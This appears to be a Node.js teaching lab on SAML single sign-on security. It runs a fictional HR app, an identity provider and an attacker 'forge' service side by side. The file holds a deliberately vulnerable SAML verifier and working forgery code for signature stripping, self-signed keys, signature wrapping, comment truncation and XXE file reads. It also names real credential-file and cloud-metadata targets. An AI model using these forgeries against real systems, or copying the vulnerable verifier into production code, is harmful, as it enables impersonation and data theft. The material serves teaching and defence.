const express = require("express");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const zlib = require("zlib");
const assert = require("assert");

// Three servers from one file:
//   ChaiCart HR (the SP, on PORT)        → has a ❌ vulnerable and a ✅ safe ACS endpoint
//   ChaiCart IdP (on PORT + 1)           → logs people in and signs SAML assertions
//   Vikram's attacker toolkit (PORT + 2) → turns HIS OWN valid login into an admin login
const PORT = Number(process.env.PORT) || 3000;
const IDP_PORT = PORT + 1;
const ATTACKER_PORT = PORT + 2;
const SP_URL = `http://localhost:${PORT}`;
const IDP_URL = `http://localhost:${IDP_PORT}`;
const ATTACKER_URL = `http://127.0.0.1:${ATTACKER_PORT}`;
const SP_ENTITY_ID = "chaicart-hr";
const IDP_ENTITY_ID = "chaicart-idp";
const ACS_URL = `${SP_URL}/acs`; // Assertion Consumer Service: where the browser POSTs the SAMLResponse
const MAX_SAML_BYTES = 20_000; // a real SAMLResponse is a few KB. Don't even parse a huge one.
const CLOCK_SKEW_MS = 60_000; // IdP and SP clocks are never perfectly in sync
const LIFETIME_MS = 5 * 60_000; // assertions and pending logins live 5 minutes

const NS = {
  samlp: "urn:oasis:names:tc:SAML:2.0:protocol",
  saml: "urn:oasis:names:tc:SAML:2.0:assertion",
  ds: "http://www.w3.org/2000/09/xmldsig#",
};
const SUCCESS = "urn:oasis:names:tc:SAML:2.0:status:Success";
const BEARER = "urn:oasis:names:tc:SAML:2.0:cm:bearer";

// ======================================================================
// A tiny XML parser + serializer, so you can SEE every trick. Never write your own in real life:
// use a maintained SAML library (passport-saml / @node-saml, samlify) and keep it patched.
// shortcut: no namespaces (we match the literal "saml:Assertion"), no CDATA, no single-quoted attributes.
// ======================================================================
const XML_ENTITIES = { lt: "<", gt: ">", amp: "&", quot: '"', apos: "'" };

function parseXml(xml, { allowDtd = false } = {}) {
  let i = 0;
  const entities = {};
  const fail = (msg) => { throw new Error(`XML: ${msg}`); };
  const match = (re) => { re.lastIndex = i; const m = re.exec(xml); if (m) i = re.lastIndex; return m; };
  const decode = (s) => s.replace(/&(#x[0-9a-f]+|#\d+|\w+);/gi, (_, e) => {
    if (e[0] === "#") return String.fromCodePoint(e[1].toLowerCase() === "x" ? parseInt(e.slice(2), 16) : Number(e.slice(1)));
    if (Object.hasOwn(XML_ENTITIES, e)) return XML_ENTITIES[e];
    if (Object.hasOwn(entities, e)) return entities[e];
    return fail(`unknown entity &${e};`);
  });

  match(/<\?xml[^?]*\?>/y);
  match(/\s*/y);
  if (xml.startsWith("<!DOCTYPE", i)) {
    // ✅ The safe parser stops here. A SAML message never needs a DOCTYPE.
    if (!allowDtd) fail("DOCTYPE is not allowed (it enables XXE and entity bombs)");
    // ❌ ATTACK 5 (XXE): <!ENTITY name SYSTEM "file:..."> = "replace &name; with the content of this file"
    const end = xml.indexOf("]>", i);
    if (end < 0) fail("unterminated DOCTYPE");
    for (const [, name, uri] of xml.slice(i, end).matchAll(/<!ENTITY\s+(\w+)\s+SYSTEM\s+"([^"]*)"\s*>/g)) {
      const file = path.resolve(__dirname, uri.replace(/^file:(\/\/)?/, ""));
      // shortcut: our fake-vulnerable parser only reads files in THIS folder, so the demo can't leak your real files.
      // A real vulnerable parser reads /etc/passwd, ~/.aws/credentials, or fetches http://169.254.169.254 (SSRF).
      if (!file.startsWith(__dirname + path.sep)) fail("demo only reads files in this folder");
      entities[name] = fs.readFileSync(file, "utf8");
    }
    i = end + 2;
  }

  function element() {
    const open = match(/<([\w:.-]+)/y) || fail(`expected an element at position ${i}`);
    const el = { type: "el", name: open[1], attrs: {}, children: [] };
    for (let a; (a = match(/\s+([\w:.-]+)\s*=\s*"([^"<]*)"/y));) {
      if (Object.hasOwn(el.attrs, a[1])) fail(`duplicate attribute ${a[1]}`);
      el.attrs[a[1]] = decode(a[2]);
    }
    const close = match(/\s*(\/?)>/y) || fail(`bad tag <${el.name}>`);
    if (close[1]) return el; // <tag/>
    for (;;) {
      let m;
      if ((m = match(/<\/([\w:.-]+)\s*>/y))) {
        if (m[1] !== el.name) fail(`</${m[1]}> does not close <${el.name}>`);
        return el;
      }
      if ((m = match(/<!--([\s\S]*?)-->/y))) el.children.push({ type: "comment", value: m[1] });
      else if ((m = match(/[^<]+/y))) el.children.push({ type: "text", value: decode(m[0]) });
      else if (xml[i] === "<" && xml[i + 1] !== "!" && xml[i + 1] !== "?") el.children.push(element());
      else fail(`unexpected input at position ${i}`);
    }
  }

  const root = element();
  match(/\s*/y);
  if (i !== xml.length) fail("content after the root element");
  return root;
}

const escapeXml = (s) => String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");

// c14n = "canonical form": the exact bytes that get hashed and signed.
// Like real Exclusive C14N "without comments": comments are DROPPED, attributes are sorted.
// `without` leaves out the Signature element itself (the "enveloped signature" transform).
function serialize(node, opts = {}) {
  if (node === opts.without) return "";
  if (node.type === "text") return escapeXml(node.value);
  if (node.type === "comment") return opts.c14n ? "" : `<!--${node.value}-->`;
  const names = Object.keys(node.attrs);
  if (opts.c14n) names.sort();
  const attrs = names.map((k) => ` ${k}="${escapeXml(node.attrs[k])}"`).join("");
  return `<${node.name}${attrs}>${node.children.map((c) => serialize(c, opts)).join("")}</${node.name}>`;
}

// Build XML in code: el("saml:Issuer", {}, "chaicart-idp")
const text = (value) => ({ type: "text", value: String(value) });
const el = (name, attrs, ...children) => ({
  type: "el", name, attrs, children: children.map((c) => (typeof c === "string" ? text(c) : c)),
});

// Read XML. All of these accept undefined, so a missing element never crashes.
const kids = (node, name) => (node?.children ?? []).filter((c) => c.type === "el" && c.name === name);
const child = (node, name) => kids(node, name)[0];
function findAll(node, name, out = []) { // every matching element, at ANY depth, in document order
  if (node?.type !== "el") return out;
  if (node.name === name) out.push(node);
  node.children.forEach((c) => findAll(c, name, out));
  return out;
}
function walk(node, out = []) { if (node?.type === "el") { out.push(node); node.children.forEach((c) => walk(c, out)); } return out; }
// ✅ ALL the text inside an element (comments skipped) vs ❌ only the FIRST text node
const textOf = (node) => node && node.children.map((c) => (c.type === "text" ? c.value : c.type === "el" ? textOf(c) : "")).join("");
const firstText = (node) => node?.children.find((c) => c.type === "text")?.value;

const newId = () => `_${crypto.randomBytes(16).toString("hex")}`; // SAML IDs must not start with a digit
const iso = (ms) => new Date(ms).toISOString();
const sha256 = (s) => crypto.createHash("sha256").update(s).digest("base64");
const fromB64 = (b64) => Buffer.from(b64, "base64").toString("utf8");
const toB64 = (s) => Buffer.from(s).toString("base64");
const str = (v) => (typeof v === "string" ? v : undefined);

// ======================================================================
// XML Signature (XML-DSig), the part SAML security stands on
// ======================================================================
// Sign one element: hash its canonical form → put the hash in SignedInfo → RSA-sign SignedInfo.
function signElement(target, privateKey, publicKey) {
  const signedInfo = el("ds:SignedInfo", {},
    el("ds:CanonicalizationMethod", { Algorithm: "http://www.w3.org/2001/10/xml-exc-c14n#" }),
    el("ds:SignatureMethod", { Algorithm: "http://www.w3.org/2001/04/xmldsig-more#rsa-sha256" }),
    el("ds:Reference", { URI: `#${target.attrs.ID}` }, // "I am signing the element with this ID"
      el("ds:DigestMethod", { Algorithm: "http://www.w3.org/2001/04/xmlenc#sha256" }),
      el("ds:DigestValue", {}, sha256(serialize(target, { c14n: true })))));
  const signature = el("ds:Signature", { "xmlns:ds": NS.ds },
    signedInfo,
    el("ds:SignatureValue", {}, crypto.sign("sha256", Buffer.from(serialize(signedInfo, { c14n: true })), privateKey).toString("base64")),
    // shortcut: real SAML puts an X.509 CERTIFICATE here (<ds:X509Certificate>). Node can't create certificates
    // without a library, so we put the raw public key. The attack (trusting this field) is exactly the same.
    el("ds:KeyInfo", {}, el("ds:KeyValue", {}, publicKey.export({ type: "spki", format: "der" }).toString("base64"))));
  target.children.splice(1, 0, signature); // right after <saml:Issuer>, where SAML puts it
}

const refUri = (sig) => child(child(sig, "ds:SignedInfo"), "ds:Reference")?.attrs.URI;

// Check that `sig` is a valid signature by `publicKey` over `target`.
// ✅ We pin the algorithms (SHA-256 + RSA-SHA256). The Algorithm attributes in the XML are attacker input, like JWT "alg" (topic 53).
function checkSignature(sig, publicKey, target) {
  if (!target) throw new Error("the signed element was not found");
  const signedInfo = child(sig, "ds:SignedInfo");
  const digest = textOf(child(child(signedInfo, "ds:Reference"), "ds:DigestValue"));
  if (sha256(serialize(target, { c14n: true, without: sig })) !== digest) throw new Error("digest mismatch: the signed element was changed");
  const value = Buffer.from(textOf(child(sig, "ds:SignatureValue")) ?? "", "base64");
  if (!crypto.verify("sha256", Buffer.from(serialize(signedInfo, { c14n: true })), publicKey, value)) throw new Error("signature is not valid for the IdP's key");
}

// ======================================================================
// 🔐 THE IdP: ChaiCart's company login (think Okta / Azure AD / Keycloak)
// ======================================================================
// shortcut: a new key pair on every start. A real IdP keeps its signing key in an HSM / secrets manager (topic 54).
const { privateKey: IDP_PRIVATE_KEY, publicKey: IDP_PUBLIC_KEY } = crypto.generateKeyPairSync("rsa", { modulusLength: 2048 });

// shortcut: in-memory Map with test accounts, lost on restart. A real IdP uses a directory (LDAP / AD, topic 63).
const idpAccounts = new Map(); // email -> { salt, passwordHash }
for (const [email, password] of [
  ["rahul@chaicart.in", "rahul-pass-11"],
  ["priya@chaicart.in", "priya-admin-77"],
  // Vikram's partner account. He owns evil.dev, so he could verify this (real, working) email address.
  ["priya@chaicart.in.evil.dev", "vikram-pass-99"],
]) {
  const salt = crypto.randomBytes(16);
  idpAccounts.set(email, { salt, passwordHash: crypto.scryptSync(password, salt, 64) });
}
const DUMMY_SALT = crypto.randomBytes(16);
function checkPassword(body) {
  const email = str(body?.email)?.trim().toLowerCase();
  const account = email ? idpAccounts.get(email) : undefined;
  // Hash even for unknown emails so the response time doesn't reveal who has an account (topic 51)
  const hash = crypto.scryptSync(str(body?.password) ?? "", account?.salt ?? DUMMY_SALT, 64);
  return account && crypto.timingSafeEqual(hash, account.passwordHash) ? email : null;
}

// Apps (SPs) registered with the IdP. The IdP sends the response ONLY to the ACS URL registered here.
const SPS = {
  "chaicart-hr": { entityId: "chaicart-hr", acs: ACS_URL },
  // A second, less careful app that trusts the same IdP (run by a vendor)
  "chai-blog": { entityId: "chai-blog", acs: "http://chai-blog.localhost/acs" },
};

function issueResponse(email, sp, inResponseTo, now = Date.now()) {
  const expires = iso(now + LIFETIME_MS);
  const assertion = el("saml:Assertion", { "xmlns:saml": NS.saml, ID: newId(), Version: "2.0", IssueInstant: iso(now) },
    el("saml:Issuer", {}, IDP_ENTITY_ID),
    el("saml:Subject", {},
      el("saml:NameID", { Format: "urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress" }, email),
      el("saml:SubjectConfirmation", { Method: BEARER },
        el("saml:SubjectConfirmationData", { ...(inResponseTo && { InResponseTo: inResponseTo }), Recipient: sp.acs, NotOnOrAfter: expires }))),
    el("saml:Conditions", { NotBefore: iso(now), NotOnOrAfter: expires },
      el("saml:AudienceRestriction", {}, el("saml:Audience", {}, sp.entityId))),
    el("saml:AuthnStatement", { AuthnInstant: iso(now), SessionIndex: newId() }));
  signElement(assertion, IDP_PRIVATE_KEY, IDP_PUBLIC_KEY); // the IdP signs the ASSERTION (the part with the identity)
  const response = el("samlp:Response", {
    "xmlns:samlp": NS.samlp, ID: newId(), Version: "2.0", IssueInstant: iso(now), Destination: sp.acs, ...(inResponseTo && { InResponseTo: inResponseTo }),
  },
  el("saml:Issuer", { "xmlns:saml": NS.saml }, IDP_ENTITY_ID),
  el("samlp:Status", {}, el("samlp:StatusCode", { Value: SUCCESS })),
  assertion);
  return `<?xml version="1.0" encoding="UTF-8"?>${serialize(response)}`;
}

const idp = express();
idp.use(express.json({ limit: "10kb" }));
idp.use(express.urlencoded({ extended: false, limit: "10kb" }));
idp.use((req, res, next) => { res.set("Cache-Control", "no-store"); next(); });

// The public key the SPs pin. An SP admin copies this ONCE, at setup time (topic 58).
idp.get("/metadata", (req, res) => {
  const key = IDP_PUBLIC_KEY.export({ type: "spki", format: "der" }).toString("base64");
  res.type("application/samlmetadata+xml").send(serialize(el("md:EntityDescriptor", { "xmlns:md": "urn:oasis:names:tc:SAML:2.0:metadata", entityID: IDP_ENTITY_ID },
    el("md:IDPSSODescriptor", {}, el("md:KeyDescriptor", { use: "signing" }, el("ds:KeyInfo", { "xmlns:ds": NS.ds }, el("ds:KeyValue", {}, key)))),
    el("md:SingleSignOnService", { Binding: "urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect", Location: `${IDP_URL}/sso` }))));
});

// Which app is asking? SP-initiated: from the AuthnRequest. IdP-initiated: ?sp=chai-blog (a tile on the IdP dashboard).
function whoIsAsking(query) {
  if (str(query.SAMLRequest)) {
    const xml = zlib.inflateRawSync(Buffer.from(query.SAMLRequest, "base64"), { maxOutputLength: 10_000 }).toString("utf8");
    const request = parseXml(xml);
    const spId = textOf(child(request, "saml:Issuer"));
    return { sp: Object.hasOwn(SPS, spId) ? SPS[spId] : undefined, inResponseTo: request.attrs.ID };
  }
  return { sp: Object.hasOwn(SPS, str(query.sp) ?? "") ? SPS[query.sp] : undefined };
}

idp.get("/sso", (req, res) => {
  // action="" posts back to this same URL, so SAMLRequest stays in the query string
  res.type("html").send(`<!doctype html><title>ChaiCart IdP</title><h1>ChaiCart company login</h1>
<form method="post" action=""><input name="email" type="email" placeholder="Email" required>
<input name="password" type="password" placeholder="Password" required><button>Log in</button></form>`);
});

idp.post("/sso", (req, res) => {
  let asking;
  try { asking = whoIsAsking(req.query); } catch { return res.status(400).json({ error: "Bad SAMLRequest" }); }
  if (!asking.sp) return res.status(400).json({ error: "Unknown app (SP)" });
  const email = checkPassword(req.body);
  if (!email) return res.status(401).json({ error: "Wrong email or password" });
  const SAMLResponse = toB64(issueResponse(email, asking.sp, asking.inResponseTo));
  console.log(`🔐 IdP: ${email} logged in, signed assertion for ${asking.sp.entityId}`);
  // A browser gets the standard auto-submitting form (HTTP-POST binding). curl gets JSON, so it's easy to copy.
  res.format({
    json: () => res.json({ acs: asking.sp.acs, SAMLResponse }),
    html: () => res.send(`<!doctype html><body onload="document.forms[0].submit()"><form method="post" action="${escapeXml(asking.sp.acs)}">
<input type="hidden" name="SAMLResponse" value="${SAMLResponse}"><noscript><button>Continue</button></noscript></form>`),
  });
});

// ======================================================================
// 🏢 THE SP: ChaiCart HR portal. It trusts the IdP for WHO you are, and its own table for WHAT you can do.
// ======================================================================
// shortcut: in-memory Maps, lost on restart. A real app uses tables (and Redis with a TTL for the two caches).
const hrUsers = new Map([["rahul@chaicart.in", { role: "employee" }], ["priya@chaicart.in", { role: "admin" }]]);
const salaries = ["rahul@chaicart.in: ₹14,00,000", "priya@chaicart.in: ₹32,00,000"];
const pendingLogins = new Map(); // AuthnRequest ID -> expiresAt. ✅ "Did WE start this login?"
const usedAssertions = new Map(); // Assertion ID -> expiresAt. ✅ "Have we seen this assertion before?"
const IDP_PINNED_KEY = IDP_PUBLIC_KEY; // ✅ copied from IdP metadata at setup time. NEVER from the incoming message.

function startLogin() {
  const now = Date.now();
  for (const [id, exp] of pendingLogins) if (exp < now) pendingLogins.delete(id);
  const id = newId();
  pendingLogins.set(id, now + LIFETIME_MS);
  // shortcut: a real SP also ties this ID to the browser's session cookie, so one browser can't finish another's login.
  const request = serialize(el("samlp:AuthnRequest", {
    "xmlns:samlp": NS.samlp, "xmlns:saml": NS.saml, ID: id, Version: "2.0", IssueInstant: iso(now), Destination: `${IDP_URL}/sso`, AssertionConsumerServiceURL: ACS_URL,
  }, el("saml:Issuer", {}, SP_ENTITY_ID)));
  // HTTP-Redirect binding: deflate → base64 → URL-encode
  return { id, url: `${IDP_URL}/sso?SAMLRequest=${encodeURIComponent(zlib.deflateRawSync(request).toString("base64"))}` };
}

// ======================================================================
// ❌ THE VULNERABLE ACS: every line marked ❌ is a bug that shipped in real SAML libraries or apps.
// ======================================================================
function verifyVulnerable(xml) {
  const doc = parseXml(xml, { allowDtd: true }); // ❌ ATTACK 5: DOCTYPE allowed → XXE
  const issuer = firstText(child(doc, "saml:Issuer"));
  if (issuer !== IDP_ENTITY_ID) throw new Error(`Unknown issuer "${issuer}"`); // ❌ echoes attacker-controlled text back

  const sig = findAll(doc, "ds:Signature")[0];
  if (sig) { // ❌ ATTACK 1: no Signature element → no signature check at all
    // ❌ ATTACK 2: verify with the key INSIDE the message. Anyone can sign with their own key and include it.
    const key = crypto.createPublicKey({ key: Buffer.from(textOf(findAll(sig, "ds:KeyValue")[0]) ?? "", "base64"), format: "der", type: "spki" });
    // ❌ ATTACK 3 (XSW): checks the element the signature POINTS AT...
    checkSignature(sig, key, walk(doc).find((e) => e.attrs.ID === refUri(sig)?.slice(1)));
  }
  const assertion = findAll(doc, "saml:Assertion")[0]; // ❌ ...but READS the first Assertion in the document
  return firstText(findAll(assertion, "saml:NameID")[0]); // ❌ ATTACK 4: only the first text node (before a comment)
  // ❌ ATTACK 6: no Audience, Recipient, expiry, InResponseTo or replay check
}

// ======================================================================
// ✅ THE SAFE ACS: the order matters. Verify first, then read ONLY from the element you verified.
// ======================================================================
function verifySafe(xml) {
  if (xml.length > MAX_SAML_BYTES) throw new Error("SAMLResponse too large");
  // Step 1: parse with NO DOCTYPE (no XXE, no billion laughs)
  const doc = parseXml(xml);
  if (doc.name !== "samlp:Response") throw new Error("not a samlp:Response");
  if (doc.attrs.Destination !== ACS_URL) throw new Error(`Destination is "${doc.attrs.Destination}", not our ACS`);
  if (child(child(doc, "samlp:Status"), "samlp:StatusCode")?.attrs.Value !== SUCCESS) throw new Error("the IdP says the login failed");

  // Step 2: exactly ONE assertion, it MUST be signed, the signature must cover THAT assertion, with the PINNED key
  const assertions = findAll(doc, "saml:Assertion");
  if (assertions.length !== 1) throw new Error(`expected exactly 1 Assertion, found ${assertions.length}`);
  const [assertion] = assertions;
  const sig = child(assertion, "ds:Signature");
  if (!sig) throw new Error("the Assertion is not signed");
  if (refUri(sig) !== `#${assertion.attrs.ID}`) throw new Error("the signature does not cover this Assertion");
  checkSignature(sig, IDP_PINNED_KEY, assertion); // KeyInfo is never read

  // Step 3: from here on, read ONLY from `assertion` (the element we verified)
  if (textOf(child(assertion, "saml:Issuer")) !== IDP_ENTITY_ID) throw new Error("wrong Issuer");
  const now = Date.now();
  const conditions = child(assertion, "saml:Conditions");
  if (!(Date.parse(conditions?.attrs.NotBefore) - CLOCK_SKEW_MS <= now && now < Date.parse(conditions?.attrs.NotOnOrAfter) + CLOCK_SKEW_MS)) {
    throw new Error("the Assertion is expired or not valid yet");
  }
  const audiences = findAll(conditions, "saml:Audience").map(textOf);
  if (!audiences.includes(SP_ENTITY_ID)) throw new Error(`the Assertion is for "${audiences.join(", ")}", not for ${SP_ENTITY_ID}`);
  const subject = child(assertion, "saml:Subject");
  const confirmation = child(subject, "saml:SubjectConfirmation");
  const data = child(confirmation, "saml:SubjectConfirmationData");
  if (confirmation?.attrs.Method !== BEARER || data?.attrs.Recipient !== ACS_URL) throw new Error("Recipient is not our ACS");
  if (!(now < Date.parse(data.attrs.NotOnOrAfter) + CLOCK_SKEW_MS)) throw new Error("SubjectConfirmation expired");

  // Step 4: one use only. The assertion ID must be new, and it must answer a login WE started.
  if (usedAssertions.has(assertion.attrs.ID)) throw new Error(`Assertion ${assertion.attrs.ID} was already used (replay)`);
  const requestId = data.attrs.InResponseTo;
  if (!requestId) throw new Error("unsolicited Response (no InResponseTo): IdP-initiated login is turned off");
  if (!(pendingLogins.get(requestId) > now)) throw new Error(`InResponseTo ${requestId} is not a login we started (or it was already used)`);
  pendingLogins.delete(requestId);
  for (const [id, exp] of usedAssertions) if (exp < now) usedAssertions.delete(id);
  usedAssertions.set(assertion.attrs.ID, Date.parse(data.attrs.NotOnOrAfter) + CLOCK_SKEW_MS);

  // Step 5: ALL the text of the NameID, not just the part before a comment
  return textOf(child(subject, "saml:NameID"));
}

const sp = express();
sp.use(express.json({ limit: "10kb" }));
sp.use(express.urlencoded({ extended: false, limit: "50kb" })); // the SAMLResponse arrives as a form POST
sp.use((req, res, next) => { res.set("Cache-Control", "no-store"); next(); });

sp.get("/", (req, res) => res.type("html").send(`<!doctype html><title>ChaiCart HR</title><h1>ChaiCart HR</h1><a href="/login">Log in with company SSO</a>`));
sp.get("/login", (req, res) => res.redirect(startLogin().url));

// One handler, two verifiers, so you can send the SAME forged response to both and compare
const acs = (verify) => (req, res) => {
  const samlResponse = str(req.body?.SAMLResponse);
  if (!samlResponse) return res.status(400).json({ error: "Missing SAMLResponse" });
  let nameId;
  try {
    nameId = verify(fromB64(samlResponse));
  } catch (err) {
    console.log(`❌ ${req.path} rejected a SAMLResponse: ${err.message.split("\n")[0]}`);
    // shortcut: debugReason is for learning. In production the user gets only the generic error, the log gets the reason.
    return res.status(401).json({ error: "SAML login failed", debugReason: err.message });
  }
  // The IdP says WHO. Our own table says WHAT they can do.
  const user = hrUsers.get(nameId);
  if (!user) return res.status(403).json({ error: `No ChaiCart HR account for ${nameId}` });
  // shortcut: a real SP now creates a session (topic 09) and redirects. We just show what you'd see.
  res.json({ message: `Welcome to ChaiCart HR, ${nameId}`, role: user.role, ...(user.role === "admin" && { salaries }) });
};
sp.post("/vulnerable/acs", acs(verifyVulnerable)); // ❌
sp.post("/acs", acs(verifySafe)); // ✅

// ======================================================================
// 😈 VIKRAM'S TOOLKIT: he has a real IdP account (priya@chaicart.in.evil.dev) and wants to be Priya, the HR admin.
// Every attack starts from HIS OWN valid, signed SAMLResponse.
// ======================================================================
const TARGET = "priya@chaicart.in";
const { privateKey: EVIL_PRIVATE_KEY, publicKey: EVIL_PUBLIC_KEY } = crypto.generateKeyPairSync("rsa", { modulusLength: 2048 });

function forge(attack, samlResponse) {
  if (attack === "xxe") { // ATTACK 5: a DOCTYPE that pulls a local file into the Issuer, which the error message echoes
    return `<?xml version="1.0"?><!DOCTYPE samlp:Response [<!ENTITY xxe SYSTEM "file:package.json">]>`
      + `<samlp:Response xmlns:samlp="${NS.samlp}" ID="${newId()}"><saml:Issuer xmlns:saml="${NS.saml}">&xxe;</saml:Issuer></samlp:Response>`;
  }
  const doc = parseXml(fromB64(samlResponse));
  const assertion = findAll(doc, "saml:Assertion")[0];
  if (!assertion) throw new Error("no Assertion in that SAMLResponse");
  const setNameId = (a, value) => { findAll(a, "saml:NameID")[0].children = [text(value)]; };
  const unsign = (a) => { a.children = a.children.filter((c) => c.name !== "ds:Signature"); };

  switch (attack) {
    case "strip": // ATTACK 1: delete the signature, change the name
      unsign(assertion);
      setNameId(assertion, TARGET);
      break;
    case "selfsigned": // ATTACK 2: change the name, re-sign with HIS key, put HIS key in KeyInfo
      unsign(assertion);
      setNameId(assertion, TARGET);
      signElement(assertion, EVIL_PRIVATE_KEY, EVIL_PUBLIC_KEY);
      break;
    case "xsw": { // ATTACK 3: keep the real signed assertion, put an unsigned copy saying "Priya" BEFORE it
      const evil = structuredClone(assertion);
      unsign(evil);
      evil.attrs.ID = newId();
      setNameId(evil, TARGET);
      doc.children.splice(doc.children.indexOf(assertion), 0, evil);
      break;
    }
    case "comment": { // ATTACK 4: priya@chaicart.in<!---->.evil.dev. The signature ignores comments, so it stays valid.
      const nameId = findAll(assertion, "saml:NameID")[0];
      const full = textOf(nameId);
      if (!full.startsWith(`${TARGET}.`)) throw new Error(`needs an account whose name starts with "${TARGET}."`);
      nameId.children = [text(TARGET), { type: "comment", value: "" }, text(full.slice(TARGET.length))];
      break;
    }
    default:
      throw new Error("attack must be strip, selfsigned, xsw, comment or xxe");
  }
  return serialize(doc);
}

const evil = express();
evil.use(express.json({ limit: "50kb" }));
evil.post("/forge/:attack", (req, res) => {
  try {
    res.json({ SAMLResponse: toB64(forge(req.params.attack, str(req.body?.SAMLResponse) ?? "")) });
  } catch (err) {
    res.status(400).json({ error: `Could not forge: ${err.message}` });
  }
});

// ---------- 404 + error handler for all three apps. Never send a stack trace to the client. ----------
for (const app of [sp, idp, evil]) {
  app.use((req, res) => res.status(404).json({ error: "Not found" }));
  app.use((err, req, res, next) => {
    if (err.type === "entity.parse.failed") return res.status(400).json({ error: "Body must be valid JSON" });
    if (err.type === "entity.too.large") return res.status(413).json({ error: "Request body too large" });
    console.error(err);
    res.status(500).json({ error: "Something went wrong" });
  });
}

// ---------- Self-check: every attack must beat the vulnerable ACS and lose to the safe one ----------
function selfCheck() {
  const loginAs = (email, now) => toB64(issueResponse(email, SPS["chaicart-hr"], startLogin().id, now));
  const nameIdOrError = (verify, b64) => { try { return verify(fromB64(b64)); } catch (err) { return `error: ${err.message}`; } };

  const rahul = loginAs("rahul@chaicart.in");
  assert.equal(nameIdOrError(verifyVulnerable, rahul), "rahul@chaicart.in");
  assert.equal(nameIdOrError(verifySafe, rahul), "rahul@chaicart.in", "safe ACS must accept a real login");
  assert.match(nameIdOrError(verifySafe, rahul), /replay/, "the same response twice must be rejected");
  assert.equal(nameIdOrError(verifyVulnerable, rahul), "rahul@chaicart.in", "vulnerable ACS accepts replays");

  for (const attack of ["strip", "selfsigned", "xsw", "comment"]) {
    const forged = toB64(forge(attack, loginAs("priya@chaicart.in.evil.dev")));
    assert.equal(nameIdOrError(verifyVulnerable, forged), TARGET, `${attack}: vulnerable ACS should be fooled`);
    assert.notEqual(nameIdOrError(verifySafe, forged), TARGET, `${attack}: safe ACS must not log in as Priya`);
  }
  const xxe = toB64(forge("xxe"));
  assert.match(nameIdOrError(verifyVulnerable, xxe), /59-saml-attacks/, "xxe: vulnerable ACS should leak package.json");
  assert.match(nameIdOrError(verifySafe, xxe), /DOCTYPE is not allowed/);

  const forBlog = toB64(issueResponse(TARGET, SPS["chai-blog"], undefined));
  assert.equal(nameIdOrError(verifyVulnerable, forBlog), TARGET, "audience: vulnerable ACS accepts another app's assertion");
  assert.match(nameIdOrError(verifySafe, forBlog), /Destination/);
  const old = loginAs("rahul@chaicart.in", Date.now() - 3_600_000);
  assert.match(nameIdOrError(verifySafe, old), /expired/);
  console.log("✅ Self-check passed: strip, self-signed, XSW, comment, XXE, replay, wrong-audience and expired attacks behave as expected");
}

sp.listen(PORT, () => {
  console.log(`🏢 ChaiCart HR (SP) on ${SP_URL}   ACS: /acs ✅  /vulnerable/acs ❌`);
  idp.listen(IDP_PORT, () => {
    console.log(`🔐 ChaiCart IdP on ${IDP_URL}   (login: /sso, metadata: /metadata)`);
    evil.listen(ATTACKER_PORT, () => {
      console.log(`😈 Attacker toolkit on ${ATTACKER_URL}   (POST /forge/:attack)`);
      try { selfCheck(); } catch (err) { console.error("❌ Self-check failed:", err.message); process.exit(1); }
    });
  });
});
